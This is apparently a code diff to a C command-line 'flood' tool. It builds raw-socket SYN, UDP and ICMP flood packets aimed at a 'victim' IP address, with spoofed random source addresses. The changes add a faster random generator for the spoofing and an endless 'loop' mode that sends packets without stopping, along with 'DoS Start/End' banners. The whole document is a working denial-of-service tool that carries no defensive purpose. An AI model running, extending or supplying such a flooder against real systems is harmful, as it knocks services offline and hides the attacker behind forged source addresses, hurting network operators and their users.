@@ -24,7 +24,24 @@
 #include <netinet/ip_icmp.h>
 #include <netinet/ip.h>
 
-unsigned short rand16b(){
+//modifier boucle for main et ajouter while(1) pour chaque cas
+
+unsigned int g_seed;
+inline void fastsrand(int seed){
+	g_seed = seed;
+}
+inline int fastrand(int active){ // Linear Congruential Generator
+	if(active){
+		g_seed = (214013*g_seed+2531011);
+		return (g_seed>>16)&0x7FFF;
+	}
+	return rand();
+}
+
+unsigned short rand16b(int mode){
+	if(mode){
+		return fastrand(1) & 0xFFFF;
+	}
     return rand() & 0xFFFF;
 }
 
@@ -34,26 +51,26 @@ int isIpAddr(char *ipAddress){
     return result != 0;
 }
 
-void randIP(char *ipAddress){
+void randIP(char *ipAddress, int frand){
     unsigned char type = rand() % 3, b1, b2, b3;
     switch(type){
         case 0: //10.0.0.0/8
-            b1 = rand() & 0xFF; // % 256
-            b2 = rand() & 0xFF; // % 256
-            b3 = (rand() & 0xFD) + 1; // % 254
+            b1 = fastrand(frand) & 0xFF; // % 256
+            b2 = fastrand(frand) & 0xFF; // % 256
+            b3 = (fastrand(frand) & 0xFD) + 1; // % 254
             sprintf(ipAddress, "10.%d.%d.%d", b1, b2, b3);
         break;
         
         case 1: //172.16.0.0/12
-            b1 = (rand() & 0xF) + 16; // % 16
-            b2 = rand() & 0xFF; // % 256
-            b3 = (rand() & 0xFD) + 1; // % 254
+            b1 = (fastrand(frand) & 0xF) + 16; // % 16
+            b2 = fastrand(frand) & 0xFF; // % 256
+            b3 = (fastrand(frand) & 0xFD) + 1; // % 254
             sprintf(ipAddress, "172.%d.%d.%d", b1, b2, b3);
         break;
         
         case 2: //192.168.0.0/16
-            b1 = rand() & 0xFF; // % 256
-            b3 = (rand() & 0xFD) + 1; // % 254
+            b1 = fastrand(frand) & 0xFF; // % 256
+            b3 = (fastrand(frand) & 0xFD) + 1; // % 254
             sprintf(ipAddress, "192.168.%d.%d", b1, b3);
         break;
     }
@@ -92,9 +109,10 @@ void transferRate (int sig){
     double now=(double)(tv.tv_sec*1e6 + tv.tv_usec)/1e6;
     tRate=(8*(float)total_count/(float)(now-tv_start))*1e-3;
     pRate=(float)packet_count/(float)(now-tv_start);
-    printf("Elapsed time %lf sec\n",now-tv_start);
+    printf("\nElapsed time %.0lf sec\n",now-tv_start);
+    printf("%ld Packets send at %.0f mbps/%.0f pps\n",packet_count,tRate,pRate);
      if(sig == SIGINT){
-         printf("Transfer rate is %f mbps \n", tRate);
+         printf("----------- DoS End -----------\n");
          exit(1);
      }
 }
@@ -114,7 +132,7 @@ struct pseudo_header    //used for checksum
     struct tcphdr tcp;
 };
 
-void synFlood(char *source, char *dest, int nb, int destPort, int debug){
+void synFlood(char *source, char *dest, int nb, int destPort, int debug, int frand){
     
     //Create a raw socket
     int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
@@ -129,7 +147,7 @@ void synFlood(char *source, char *dest, int nb, int destPort, int debug){
      
     //strcpy(source_ip , "192.168.1.2"); 
     if(strcmp(source, "") == 0){ //preferably an address that doesn't exist 
-        randIP(source_ip); //in order to avoid a REST send back
+        randIP(source_ip, frand); //in order to avoid a REST send back
     }                      //, ideally randomized
     else{
         strcpy(source_ip , source);
@@ -138,7 +156,7 @@ void synFlood(char *source, char *dest, int nb, int destPort, int debug){
     sin.sin_port = htons(destPort); // ex 80
     //sin.sin_addr.s_addr = inet_addr ("1.2.3.4"); 
     sin.sin_addr.s_addr = inet_addr (dest); // victim destination address
-     
+    
     memset (datagram, 0, 4096); /* zero out the buffer */
     int packet_size = sizeof (struct ip) + sizeof (struct tcphdr);
     //IP Header
@@ -146,7 +164,7 @@ void synFlood(char *source, char *dest, int nb, int destPort, int debug){
     iph->version = 4;
     iph->tos = 0;
     iph->tot_len = packet_size;
-    iph->id = htons(rand16b());  //Id of this packet
+    iph->id = htons(rand16b(frand));  //Id of this packet
     iph->frag_off = 0;
     iph->ttl = 255;
     iph->protocol = IPPROTO_TCP;
@@ -157,7 +175,7 @@ void synFlood(char *source, char *dest, int nb, int destPort, int debug){
     iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
      
     //TCP Header
-    int sPort = rand16b();
+    int sPort = rand16b(frand);
     tcph->source = htons (sPort); // ideally randomize
     tcph->dest = htons (destPort); // ex 80 
     tcph->seq = 0;
@@ -209,7 +227,7 @@ void synFlood(char *source, char *dest, int nb, int destPort, int debug){
         packet_count++;
         total_count=total_count+packet_size;
     }
-        
+    close(s);    
 }
 
 /*******************************
@@ -232,9 +250,9 @@ struct pseudo_header_udp{
     u_int16_t udp_length;
 };
 
-void udpFlood(char *sourceInterface, char *dest, int nb, int destPort, int debug){
+void udpFlood(char *sourceInterface, char *dest, int nb, int destPort, int debug, int frand){
 
-    int sPort = rand16b(); // ideally randomize
+    int sPort = rand16b(frand);
     if(strcmp(sourceInterface, "eth0") == 0){
         //create socket 
         int sock = socket( AF_INET, SOCK_DGRAM, 0 );
@@ -318,7 +336,7 @@ void udpFlood(char *sourceInterface, char *dest, int nb, int destPort, int debug
         //Source ip
         //strcpy(source_ip , "192.168.1.2");
         if(strcmp(sourceInterface, "") == 0){
-            randIP(source_ip);
+            randIP(source_ip, frand);
         }
         else{
             strcpy(source_ip , sourceInterface);
@@ -334,7 +352,7 @@ void udpFlood(char *sourceInterface, char *dest, int nb, int destPort, int debug
         iph->version = 4;
         iph->tos = 0;
         iph->tot_len = packet_size;
-        iph->id = htonl (rand16b()); //Id of this packet
+        iph->id = htonl (rand16b(frand)); //Id of this packet
         iph->frag_off = 0;
         iph->ttl = 255;
         iph->protocol = IPPROTO_UDP;
@@ -346,7 +364,7 @@ void udpFlood(char *sourceInterface, char *dest, int nb, int destPort, int debug
         iph->check = csum ((unsigned short *) datagram, iph->tot_len);
         
         //UDP header
-        int sPort = rand16b();
+        int sPort = rand16b(frand);
         udph->source = htons (sPort);
         udph->dest = htons (destPort);
         udph->len = htons(8 + strlen(data)); //tcp header size
@@ -379,6 +397,7 @@ void udpFlood(char *sourceInterface, char *dest, int nb, int destPort, int debug
             packet_count++;
             total_count=total_count+packet_size;
         }
+        close(s);
     }
 }
 
@@ -386,14 +405,14 @@ void udpFlood(char *sourceInterface, char *dest, int nb, int destPort, int debug
             ICMP FLOOD
 ********************************/
 
-void icmpFlood(char *source, char *dest, int nb, int debug){
+void icmpFlood(char *source, char *dest, int nb, int debug, int frand){
     unsigned long daddr;
     unsigned long saddr;
     int payload_size = 32, sent_size;
     char source_ip[32];
     
     if(strcmp(source, "") == 0){ //preferably an address that doesn't exist 
-        randIP(source_ip); //in order to avoid a REST send back
+        randIP(source_ip, frand); //in order to avoid a REST send back
     }                      //, ideally randomized
     else{
         strcpy(source_ip , source);
@@ -439,12 +458,12 @@ void icmpFlood(char *source, char *dest, int nb, int debug){
     
     //zero out packet buffer
     memset (packet, 0, packet_size);
-    printf("%d\n",packet_size);
+    //printf("%d\n",packet_size);
     ip->version = 4;
     ip->ihl = 5;
     ip->tos = 0;
     ip->tot_len = htons (packet_size);
-    ip->id = rand16b();
+    ip->id = rand16b(frand);
     ip->frag_off = 0;
     ip->ttl = 255;
     ip->protocol = IPPROTO_ICMP;
@@ -457,8 +476,8 @@ void icmpFlood(char *source, char *dest, int nb, int debug){
     
     icmp->type = ICMP_ECHO;
     icmp->code = 0;
-    icmp->un.echo.sequence = rand16b();
-    icmp->un.echo.id = rand16b();
+    icmp->un.echo.sequence = rand16b(frand);
+    icmp->un.echo.id = rand16b(frand);
     //checksum
     icmp->checksum = csum((unsigned short *)icmp, sizeof(struct icmphdr) + payload_size);
      
@@ -487,22 +506,23 @@ void icmpFlood(char *source, char *dest, int nb, int debug){
  
 int main (int argc, char *argv[]){
     srand(time(NULL));
+	fastsrand(time(NULL));
     /********************
         Command Check
     *********************/
     int debug = 0;
-    char usage[] = "flood <mode:syn|udp|icmp|help> <source: ip|interface name|random> <dest: ip> <number to send> <dest Port|icmp payload:32> <debug mode: debug>";
-    if(argc == 1 || (argc <= 6 && argc > 7)){
+    char usage[] = "flood <mode:syn|udp|icmp|help> <source: ip|interface name|random|fastrandom> <dest: ip> <number to send|loop> <dest Port|icmp payload:32> <debug mode: debug>";
+    if(argc == 1 || (argc < 5 && argc > 7)){
         printf ("Error Usage : %s\n",usage);
         exit(0);
     }
-    if(strcmp(argv[1],"help") == 0 || (strcmp(argv[1],"syn") != 0 && strcmp(argv[1],"udp") != 0 && strcmp(argv[1],"icmp") != 0) ){
+    if(strcmp(argv[1],"help") == 0 || (strcmp(argv[1],"syn") != 0 && strcmp(argv[1],"udp") != 0 && (strcmp(argv[1],"icmp") != 0)) ){
         printf ("Usage : %s\n",usage);
         exit(0);
     }
     
     char *ethType = strstr(argv[2], "eth"), *enType = strstr(argv[2], "en"), *emType = strstr(argv[2], "em"), *wlanType = strstr(argv[2], "wlan"); 
-       if(!isIpAddr(argv[2]) && (ethType == NULL && enType == NULL && emType == NULL && wlanType == NULL) && strcmp(argv[2],"random") != 0){
+	if(!isIpAddr(argv[2]) && (ethType == NULL && enType == NULL && emType == NULL && wlanType == NULL) && strcmp(argv[2],"random") != 0 && strcmp(argv[2],"fastrandom") != 0){
         printf ("Error Usage arg 2 : %s\n",usage);
         exit(0);
     }
@@ -510,15 +530,16 @@ int main (int argc, char *argv[]){
         printf ("Error Usage arg 3 : %s\n",usage);
         exit(0);
     }
-    if(atoi(argv[4]) <= 0){
-        printf ("Error Usage arg 4 : %s\n",usage);
-        exit(0);
+    if(atoi(argv[4]) <= 0 && strcmp(argv[4],"loop") != 0){
+		printf ("Error Usage arg 4 : %s\n",usage);
+		exit(0);
+	}
+    if(strcmp(argv[1],"syn") == 0 || strcmp(argv[1],"udp") == 0){
+		if(atoi(argv[5]) <= 0 || atoi(argv[5]) > 65535){
+		    printf ("Error Usage arg 5 : %s\n",usage);
+		    exit(0);
+		}
     }
-    if(atoi(argv[5]) <= 0 || atoi(argv[5]) > 65535){
-        printf ("Error Usage arg 5 : %s\n",usage);
-        exit(0);
-    }
-    
     if(strcmp(argv[argc-1],"debug") == 0 ){
         debug = 1;
     }
@@ -531,63 +552,135 @@ int main (int argc, char *argv[]){
     tv_start=(double)(tv.tv_sec*1e6 + tv.tv_usec)/1e6;
     
     /********************
-        SYN Start
+		   SYN Start
     *********************/
     
-    int i;
+    int i=0, max=atoi(argv[4]), loop=0;
+    if(strcmp(argv[4],"loop") == 0){
+    	loop=1;
+    }
     if(strcmp(argv[1],"syn") == 0){
-        printf("----------- SYN DoS Start----------\n");
-        if(strcmp(argv[2],"random") == 0){
-            for(i=0;i<atoi(argv[4]);i++){
-                synFlood("",argv[3],i+1,atoi(argv[5]),debug);
-            }
-        }
-        else{
-            for(i=0;i<atoi(argv[4]);i++){
-                synFlood(argv[2],argv[3],i+1,atoi(argv[5]),debug);
-            }
-        }
+        printf("---------- SYN DoS Start ----------\n");
+        if(!loop){
+		    if(strcmp(argv[2],"random") == 0){
+		        for(i=0;i<max;i++){
+		            synFlood("",argv[3],i+1,atoi(argv[5]),debug,0);
+		        }
+		    }
+		    else if(strcmp(argv[2],"fastrandom") == 0){
+		        for(i=0;i<max;i++){
+		            synFlood("",argv[3],i+1,atoi(argv[5]),debug, 1);
+		        }
+		    }
+		    else{
+		        for(i=0;i<max;i++){                
+					synFlood(argv[2],argv[3],i+1,atoi(argv[5]),debug,0);
+		        }
+		    }
+	    }
+	    else{
+	    	if(strcmp(argv[2],"random") == 0){
+		        while(1){
+		            synFlood("",argv[3],i+1,atoi(argv[5]),debug,0);
+		        }
+		    }
+		    else if(strcmp(argv[2],"fastrandom") == 0){
+		        while(1){
+		            synFlood("",argv[3],i+1,atoi(argv[5]),debug, 1);
+		        }
+		    }
+		    else{
+		        while(1){
+		     		synFlood(argv[2],argv[3],i+1,atoi(argv[5]),debug,0);
+		        }
+		    }
+	    }
         transferRate(0);
-        printf("%d Packets send at %.2f mbps/%.2f pps\n",atoi(argv[4]),tRate,pRate);
-        printf("----------- SYN DoS End----------\n");
+        printf("----------- SYN DoS End -----------\n");
     }
     /********************
-        UDP Start
+		  UDP Start
     *********************/
     else if(strcmp(argv[1],"udp") == 0){
-        printf("----------- UDP DoS Start----------\n");
-        if(strcmp(argv[2],"random") == 0){
-            for(i=0;i<atoi(argv[4]);i++){
-                udpFlood("",argv[3],i+1,atoi(argv[5]),debug);
-            }        
-        }
-        else{
-            for(i=0;i<atoi(argv[4]);i++){
-                udpFlood(argv[2],argv[3],i+1,atoi(argv[5]),debug);
-            }            
-        }
+        printf("---------- UDP DoS Start ----------\n");
+        if(!loop){
+		    if(strcmp(argv[2],"random") == 0){
+		        for(i=0;i<max || loop == 1;i++){
+		            udpFlood("",argv[3],i+1,atoi(argv[5]),debug,0);
+		        }        
+		    }
+		    else if(strcmp(argv[2],"fastrandom") == 0){
+		        for(i=0;i<max;i++){
+		            udpFlood("",argv[3],i+1,atoi(argv[5]),debug,1);
+		        }
+		    }
+		    else{
+		        for(i=0;i<max;i++){
+					udpFlood(argv[2],argv[3],i+1,atoi(argv[5]),debug,0);
+		        }            
+		    }
+	    }
+	    else{
+	    	if(strcmp(argv[2],"random") == 0){
+		        while(1){
+		            udpFlood("",argv[3],i+1,atoi(argv[5]),debug,0);
+		        }        
+		    }
+		    else if(strcmp(argv[2],"fastrandom") == 0){
+		        while(1){
+		            udpFlood("",argv[3],i+1,atoi(argv[5]),debug,1);
+		        }
+		    }
+		    else{
+		        while(1){
+               		udpFlood(argv[2],argv[3],i+1,atoi(argv[5]),debug,0);
+		        }            
+		    }
+	    }
         transferRate(0);
-        printf("%d Packets send at %.2f mbps/%.2f pps\n",atoi(argv[4]), tRate, pRate);
-        printf("----------- UDP DoS End----------\n");
+        printf("----------- UDP DoS End -----------\n");
     }
     /********************
-        ICMP Start
+		  ICMP Start
     *********************/
     else if(strcmp(argv[1],"icmp") == 0){
-        printf("----------- ICMP DoS Start----------\n");
-        if(strcmp(argv[2],"random") == 0){
-            for(i=0;i<atoi(argv[4]);i++){
-                icmpFlood("",argv[3],i+1,debug);
-            }        
-        }
-        else{
-            for(i=0;i<atoi(argv[4]);i++){
-                icmpFlood(argv[2],argv[3],i+1,debug);
-            }            
-        }
+        printf("---------- ICMP DoS Start----------\n");
+        if(!loop){
+		    if(strcmp(argv[2],"random") == 0){
+		        for(i=0;i<max;i++){
+		            icmpFlood("",argv[3],i+1,debug,0);
+		        }        
+		    }
+		    else if(strcmp(argv[2],"fastrandom") == 0){
+		        for(i=0;i<max;i++){
+		            icmpFlood("",argv[3],i+1,debug,1);
+		        }
+		    }
+		    else{
+		        for(i=0;i<max;i++){
+		            icmpFlood(argv[2],argv[3],i+1,debug,0);
+		        }            
+		    }
+	    }
+	    else{
+	    	if(strcmp(argv[2],"random") == 0){
+		        while(1){
+		            icmpFlood("",argv[3],i+1,debug,0);
+		        }        
+		    }
+		    else if(strcmp(argv[2],"fastrandom") == 0){
+		        while(1){
+		            icmpFlood("",argv[3],i+1,debug,1);
+		        }
+		    }
+		    else{
+		        while(1){
+		            icmpFlood(argv[2],argv[3],i+1,debug,0);
+		        }            
+		    }
+	    }
         transferRate(0);
-        printf("%d Packets send at %.2f mbps/%.2f pps\n",atoi(argv[4]),tRate,pRate);
-        printf("----------- ICMP DoS End----------\n");
+        printf("---------- ICMP DoS End  ----------\n");
     }
     return 0;
 }
